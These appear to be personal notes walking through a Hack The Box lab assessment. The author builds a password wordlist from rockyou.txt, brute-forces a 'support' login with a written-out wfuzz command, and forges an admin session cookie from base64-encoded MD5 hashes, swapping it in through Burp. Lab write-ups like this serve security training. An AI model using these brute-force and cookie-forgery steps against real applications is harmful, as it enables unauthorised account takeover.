Assess the web application and use various techniques to escalate to a privileged user and find a flag in the admin panel. Submit the contents of the flag as your answer.

![[Pasted image 20231220114044.png]]

Acccccccccccccccccccc@1

Password policy is 

- Must start with a capital letter
- Must end with a digit
- Must contain at least one character from the specials characters `$`, `#`, or `@`
- Must be at least 20 characters long
- Must be no more than 29 characters
![[Pasted image 20231220114557.png]]

![[Pasted image 20231220114630.png]]

![[Pasted image 20231220114640.png]]

![[Pasted image 20231220114838.png]]

There is a support user name

Generate a wordlist based on the requirements 
```
grep '^[[:upper:]]' /usr/share/wordlists/rockyou.txt | grep '[[:digit:]]$' |grep '[#@$]' | grep -x '.\{20,29\}' | grep '[[:lower:]]' > passwords.txt
```

we can also use wfuzz
```
wfuzz -s 10 -w ./passwords.txt --hs "Invalid credentials" -d "userid=support&passwd=FUZZ&submit="submit"" "http://94.237.63.93:45491/login.php"
```


![[Pasted image 20231220120026.png]]

![[Pasted image 20231220120101.png]]

suport.it : Mustang#firebird1995

![[Pasted image 20231220120419.png]]
We have a HTB_sessid

htb_sessid=YjNiOGI1Y2Y0MjFkM2Y5NmY2NDY5ZmE2MThhNmJiN2Y6NDM0OTkwYzhhMjVkMmJlOTQ4NjM1NjFhZTk4YmQ2ODI%3D

![[Pasted image 20231220120211.png]]

![[Pasted image 20231220120520.png]]

Now copy the first part of the hash

![[Pasted image 20231220120550.png]]

![[Pasted image 20231220120631.png]]

First part of the admin hash

![[Pasted image 20231220120742.png]]
Second part
![[Pasted image 20231220120755.png]]

b98c32ffebc4bc562184c7be1c3ec277:21232f297a57a5a743894a0e4a801fc3

![[Pasted image 20231220120842.png]]
Yjk4YzMyZmZlYmM0YmM1NjIxODRjN2JlMWMzZWMyNzc6MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM=

I ended up logging in and replaced the cookie in burp

![[Pasted image 20231220121614.png]]